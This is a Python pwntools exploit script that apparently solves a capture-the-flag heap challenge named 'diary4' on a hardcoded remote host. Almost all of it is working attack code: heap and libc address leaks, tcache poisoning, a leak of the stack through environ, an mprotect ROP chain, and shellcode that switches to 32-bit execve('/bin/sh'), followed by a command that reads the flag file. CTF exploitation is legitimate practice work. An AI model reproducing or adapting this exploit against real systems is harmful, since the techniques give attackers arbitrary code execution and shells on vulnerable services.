#!/usr/bin/env python3

from pwn import *

exe = ELF("./diary4")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.32.so")

HOST, PORT = "138.68.144.69", 32325

context.binary = exe
# (For GDB) uncomment if using tmux
# context.terminal = ["tmux", "splitw", "-h", "-p", "75"]

# Globals
#DEBUG = False
DEBUG = True
GDBSCRIPT = """\
"""

RECV_TIMEOUT = 3  # 3 seconds
DELAY_SECONDS = 0.3  # 0.3 seconds
LIBC_LEAK_OFFSET = libc.sym.main_arena + 1120 + 0x0A
HEAP_LEAK_OFFSET = 0x1500 + 0x0A
TCACHE_IDX_OFFSET = 0x210
HEAP_SHELLCODE_OFFSET = 0x2B0
RET_ADDR_OFFSET = 0x148


def main():
    global io

    io = conn()

    # Leak libc address

    add(b"0", pencil=True)
    for i in range(8):
        add(f"{i + 1}".encode(), pencil=True)

    for _ in range(7):
        delete(0)

    for _ in range(2):
        delete(1)

    for i in range(7):
        add(f"{i}".encode(), pencil=False)

    add(b"", pencil=False)
    buf = print_diary()
    libc.address = leak(buf, LIBC_LEAK_OFFSET, "libc", verbose=True)
    if not islibc(libc.address):
        log.failure(f"Failed to leak libc")
        return False

    # Leak heap address

    delete(0)
    add(cyclic(8))
    buf = print_diary()[8:]
    heap = leak(buf, HEAP_LEAK_OFFSET, "heap", verbose=True)
    if not isheap(heap):
        log.failure(f"Failed to leak heap")
        return False

    # Exploit

    delay()
    for _ in range(7):
        delete(0)

    delay()
    io.sendline(b"0" * 0x1000)
    delay()
    io.recvuntil(b"choice: ")
    delete(1)
    io.recvuntil(b"choice: ")
    delay()
    io.sendline(b"0" * 0x1000)

    victim = heap + TCACHE_IDX_OFFSET
    delay()
    delay()
    log.info(f"Victim (tcache idx): {victim:#x}")
    edit(flat(victim - 0x10))
    delay()
    add(b"A")

    addr = 0x1337000
    binsh = unpack(b"/bin/sh\0")
    asm_shellcode = shellcraft.nop() * 8
    asm_shellcode += shellcraft.mmap(
        addr=addr, length=0x1000, prot=7, flags=0x22, fd=0, offset=0
    )
    asm_shellcode += f"movabs r10, {addr:#x}\n"
    asm_shellcode += f"movabs r11, {binsh:#x}\n"
    asm_shellcode += "mov QWORD PTR [r10], r11\n"
    shellcode = asm(asm_shellcode)
    context.clear(arch="i386")
    asm_shellcode = shellcraft.execve(addr, 0, 0)
    shellcode += asm(asm_shellcode)
    context.clear(arch="amd64")
    add(shellcode)

    delay()
    add(b"B", pencil=True)
    delay()
    add(flat(victim - 0x30))
    target = libc.sym.environ - 0x10
    log.info(f"Overwrite victim with environ-0x10 ({target:#x})")
    delay()
    payload = flat(
        b"A" * 40,
        0x2,
        target,
        b"C" * 8,
    )
    add(payload)

    add(b"B" * 7)
    buf = print_diary()[8:]
    environ = leak(buf, 0x0, "environ", verbose=True)
    if not isstack(environ):
        log.failure(f"Failed to leak environ")
        return False

    ret_addr = environ - RET_ADDR_OFFSET
    move(2, "left")
    io.recvuntil(b"choice: ")
    io.sendline(b"11")
    log.info(f"Overwrite victim with (stack) return address ({ret_addr:#x})")
    delay()
    edit(flat(ret_addr))

    roplibc = ROP(libc)
    pop_r13_jmp_rax = find_gadget(roplibc, ["pop r13", "jmp rax"])
    jmp_rax = find_gadget(roplibc, ["jmp rax"])
    pop_rax = find_gadget(roplibc, ["pop rax", "ret"])
    pop_rdi = find_gadget(roplibc, ["pop rdi", "ret"])
    pop_rsi = find_gadget(roplibc, ["pop rsi", "ret"])
    pop_rdx = find_gadget(roplibc, ["pop rdx", "ret"])
    pop_rcx_rbx = find_gadget(roplibc, ["pop rcx", "pop rbx", "ret"])
    int_0x80 = find_gadget(roplibc, ["int 0x80"])

    payload = flat(
        pop_rdi,
        heap,
        pop_rsi,
        0x1000,
        pop_rdx,
        7,
        libc.sym.mprotect,
        pop_rax,
        heap + HEAP_SHELLCODE_OFFSET,
        jmp_rax,
    )
    delay()

    add(payload)
    io.recvuntil(b": ")
    io.sendline(b"set -v; exec <$(echo *.txt)")
    line = io.recvline(keepends=False)
    print(line)
    flag = line.split(b":")[0].decode()
    log.success(f"Flag: {flag}")
    return True


def leak(buf, offset, leaktype, verbose=False):
    verbose and log.info(f"buf: {buf}")
    leak_addr = unpack(buf.ljust(context.bytes, b"\x00"))
    base_addr = leak_addr - offset
    verbose and log.info(f"{leaktype} leak: {leak_addr:#x}")
    log.success(f"{leaktype} base address: {base_addr:#x}")
    return base_addr


def find_gadget(ropelf, instructions):
    gadget = ropelf.find_gadget(instructions)
    if gadget is None:
        addr = next(libc.search(asm("; ".join(instructions))))
    else:
        addr = gadget.address
    return addr


def islibc(addr):
    p = pack(addr)
    return len(p.rstrip(b"\0")) == 6 and p[5] in range(0x70, 0x80)


def isheap(addr):
    p = pack(addr)
    return len(p.rstrip(b"\0")) == 6 and p[5] in range(0x50, 0x60)


def isstack(addr):
    p = pack(addr)
    return len(p.rstrip(b"\0")) == 6 and p[5] in range(0x70, 0x80)


def delay():
    log.warn("Delaying...")
    sleep(DELAY_SECONDS)


def add(data, num_traverse=0, pencil=False):
    DEBUG and log.info(f"add(data={data}, num_traverse={num_traverse}, pencil={pencil})")
    io.sendlineafter(b"choice: ", b"1")  # 1. ðŸ˜ƒ Add a Page
    use = b"2" if pencil else b"1"
    io.sendlineafter(b"choice: ", use)
    buf = io.recv(5, timeout=RECV_TIMEOUT)
    if buf == b"pages":
        io.sendline(f"{abs(num_traverse)}".encode())
        direction = b"left" if num_traverse < 0 else b"right"
        io.sendlineafter(b"right or left: ", direction)
    io.sendlineafter(b"data for the page", data)


def delete(num_traverse):
    DEBUG and log.info(f"delete(num_traverse={num_traverse})")
    io.sendlineafter(b"choice: ", b"2")  # 2. ðŸ˜ƒ Delete a Page
    io.sendlineafter(b"pages to traverse: ", f"{abs(num_traverse)}".encode())
    direction = b"left" if num_traverse < 0 else b"right"
    io.sendlineafter(b"right or left: ", direction)


def move(num_traverse, direction):
    DEBUG and log.info(f"move(num_traverse={num_traverse}, direction={direction})")
    io.sendlineafter(b"choice: ", b"3")  # 3. ðŸ˜ƒ Switch a Page
    io.sendlineafter(b"traverse: ", f"{num_traverse}".encode())
    io.sendlineafter(b"left: ", direction.encode())


def print_diary():
    io.sendlineafter(b"choice: ", b"4")  # 4. ðŸ˜ƒ Print a Page
    io.recvuntil(b": \n")
    return io.recvuntil(b"\n\n\xf0\x9f\x93\x96", drop=True)


def edit(data):
    DEBUG and log.info(f"edit(data={data})")
    io.sendlineafter(b"choice: ", b"5")  # 5. ðŸ˜ƒ Edit a Page
    io.sendlineafter(b"input data for the page: ", data)


def conn():
    if args.REMOTE:
        p = remote(HOST, PORT)
    elif args.GDB:
        p = gdb.debug(exe.path, gdbscript=GDBSCRIPT)
    else:
        p = process(exe.path)

    return p


if __name__ == "__main__":
    io = None
    done = False
    while not done:
        try:
            done = main()
        except EOFError:
            log.failure("EOFError! Restarting exploit")
        finally:
            if io:
                io.close()
